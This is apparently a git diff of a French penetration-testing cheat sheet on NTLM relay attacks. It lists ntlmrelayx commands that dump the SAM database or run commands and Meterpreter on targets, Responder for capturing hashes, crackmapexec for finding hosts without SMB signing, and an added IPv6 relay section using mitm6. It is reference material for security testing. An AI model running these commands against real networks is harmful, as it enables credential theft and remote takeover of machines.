@@ -24,7 +24,7 @@ Dumper la base SAM : ntlmrelayx -tf <TARGETS.txt>
 Exécuter une commande : ntlmrelayx -tf <TARGETS.txt> -c <COMMANDE ou METERPRETER>
 
 # Terminal 2
-sudo python3 responder -I eth0 -d -w
+sudo python3 responder -I eth0 -d -w # Les hashs sont visibles dans Responder/logs/Responder-Session.log
 ```
 
 #### TIPS
@@ -35,4 +35,22 @@ Le fichier `TARGETS.txt` contient les IP des machines dont la signature SMB n'es
 
 ```
 cme smb <IP>/<MASK> --gen-relay-list <TARGETS.txt>
+```
+
+### IPv6
+
+Prendre la dernière version de `mitm6` ([https://github.com/dirkjanm/mitm6](https://github.com/dirkjanm/mitm6)). Après l'installation, en cas d'erreur `matplotlib`, exécuter la commande suivante :&#x20;
+
+```
+sudo pip install --upgrade matplotlib
+```
+
+Pour relayer les commandes sont les suivantes :&#x20;
+
+```
+# Terminal 1
+ntlmrelayx.py -6 -tf <TARGETS.txt>
+
+# Terminal 2
+mitm6 -d <DOMAIN.LOCAL>
 ```
